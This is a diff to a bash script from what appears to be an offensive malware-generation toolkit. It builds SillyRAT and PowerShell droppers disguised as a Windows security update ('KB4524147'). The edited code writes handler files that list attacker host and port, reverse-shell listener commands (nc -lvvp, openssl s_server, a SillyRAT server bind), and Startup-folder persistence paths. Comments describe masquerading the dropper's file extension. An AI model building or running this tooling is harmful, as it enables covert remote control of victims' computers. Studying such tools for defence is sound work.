@@ -10275,7 +10275,7 @@ Drop=$(zenity --title="☠ Enter AGENT|DROPPER FILENAME ☠" --text "example: Pr
 SOSP=$(zenity --list --title "☠ Target Operative system sellection ☠" --text "Remark: Sellecting 'Cancel' or 'Mac' will not create the dropper.\nWithout the dropper the Client.py requires to be manual executed\nand it will no longer auto-install SillyRAT python3 dependencies." --radiolist --column "Pick" --column "Option" TRUE "Windows" FALSE "Linux" FALSE "Mac" --height 240) > /dev/null 2>&1
 if [ "$SOSP" = "Windows" ]; then rpath=$(zenity --title="☠ Enter Files Upload Path (target dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%\n(*) Recomended Path For Upload our files.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1;fi
 
-random_name=$(cat /dev/urandom | tr -dc 'a-zA-Z0-7' | fold -w 4 | head -n 1)
+random_name=$(cat /dev/urandom | tr -dc '0-7' | fold -w 3 | head -n 1)
 easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
 ## Setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
@@ -10536,14 +10536,16 @@ sleep 2
 dtr=$(date|awk {'print $2,$3,$4,$5'})
 if [ "$persistence" = "Add persistence" ]; then
    ## Write how to delete persistence to output folder ..
-   echo "LPORT    : $lport" > $IPATH/output/persistence_ID_$random_name.handler
-   echo "LHOST    : $lhost" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "DATE     : $dtr" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "HANDLER  : cd bin/SillyRAT && service apache2 start" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "HANDLER  : python3 server.py bind --address 0.0.0.0 --port $lport" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "+--------------------------------------+" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "|DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "+--------------------------------------+" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "ID         : $random_name" > $IPATH/output/persistence_ID_$random_name.handler
+   echo "LPORT      : $lport" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "LHOST      : $lhost" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "DATE       : $dtr" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "AGENT RPATH: $rpath\\$Drop.py" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "HANDLER    : cd bin/SillyRAT && service apache2 start" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "HANDLER    : python3 server.py bind --address 0.0.0.0 --port $lport" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "DELETE PERSISTENCE" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "------------------" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "cmd /C echo Y | powershell Set-ExecutionPolicy Restricted -Scope CurrentUser" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $IPATH/output/persistence_ID_$random_name.handler
    zenity --title="☠ SillyRAT persistence ☠" --text "Settings related to persistence stored under:\n$IPATH/output/persistence_ID_$random_name.handler" --info --width 340 --height 130 > /dev/null 2>&1
@@ -12752,8 +12754,8 @@ if [ -z "$NaM" ]; then NaM="Security-Update";fi
 if [ -z "$Drop" ]; then Drop="Update-KB4524147";fi
 
 
-## Generate Random {4 chars} Persistence script name. { KB4524147_4Fn7.update }
-random_name=$(cat /dev/urandom | tr -dc 'a-zA-Z0-7' | fold -w 4 | head -n 1)
+## Generate Random {4 chars} Persistence script name. { KB4524147_4Fn.update }
+random_name=$(cat /dev/urandom | tr -dc '0-7' | fold -w 3 | head -n 1)
 wvd=$(echo $rpath|sed "s|^[%]|\$env:|"|sed "s|%||")
 # display final settings to user
 echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};
@@ -12929,14 +12931,16 @@ rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 ## Remark related to 'persistence' function..
 if [ "$persistence" = "Add persistence" ]; then
    ## Write how to delete persistence to output folder ..
-   echo "LPORT    :$lport" > $IPATH/output/persistence_ID_$random_name.handler
-   echo "LHOST    :$lhost" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "DATE     :$dtr" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "HANDLER  :cd output" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "HANDLER  :sudo openssl s_server -quiet -key key.pem -cert cert.pem -port $lport" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "+--------------------------------------+" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "|DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "+--------------------------------------+" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "ID         : $random_name" > $IPATH/output/persistence_ID_$random_name.handler
+   echo "LPORT      : $lport" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "LHOST      : $lhost" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "DATE       : $dtr" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "AGENT RPATH: $rpath\\$NaM.ps1" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "HANDLER    : cd output" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "HANDLER    : sudo openssl s_server -quiet -key key.pem -cert cert.pem -port $lport" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "DELETE PERSISTENCE" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "------------------" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "cmd /C echo Y | powershell Set-ExecutionPolicy Restricted -Scope CurrentUser" >> $IPATH/output/persistence_ID_$random_name.handler
    if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
       echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/persistence_ID_$random_name.handler
@@ -12989,8 +12993,8 @@ if [ -z "$NaM" ]; then NaM="Security-Update";fi
 if [ -z "$Drop" ]; then Drop="Update-KB4524147";fi
 
 
-## Generate Random {4 chars} Persistence script name. { KB4524147_4Fn7.update }
-random_name=$(cat /dev/urandom | tr -dc 'a-zA-Z0-7' | fold -w 4 | head -n 1)
+## Generate Random {4 chars} Persistence script name. { KB4524147_4Fn.update }
+random_name=$(cat /dev/urandom | tr -dc '0-7' | fold -w 3 | head -n 1)
 wvd=$(echo $rpath|sed "s|^[%]|\$env:|"|sed "s|%||")
 ## Random chose one fake extension.
 # to Masquerade the dropper real extension (MITRE T1036)
@@ -13163,13 +13167,15 @@ rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 ## Remark related to 'persistence' function..
 if [ "$persistence" = "Add persistence" ]; then
    ## Write how to delete persistence to output folder ..
-   echo "LPORT    :$lport" > $IPATH/output/persistence_ID_$random_name.handler
-   echo "LHOST    :$lhost" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "DATE     :$dtr" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "HANDLER  :sudo nc -lvvp $lport" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "+--------------------------------------+" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "|DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "+--------------------------------------+" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "ID         : $random_name" > $IPATH/output/persistence_ID_$random_name.handler
+   echo "LPORT      : $lport" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "LHOST      : $lhost" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "DATE       : $dtr" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "AGENT RPATH: $rpath\\$NaM.ps1" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "HANDLER    : sudo nc -lvvp $lport" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "DELETE PERSISTENCE" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "------------------" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "cmd /C echo Y | powershell Set-ExecutionPolicy Restricted -Scope CurrentUser" >> $IPATH/output/persistence_ID_$random_name.handler
    if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
       echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/persistence_ID_$random_name.handler
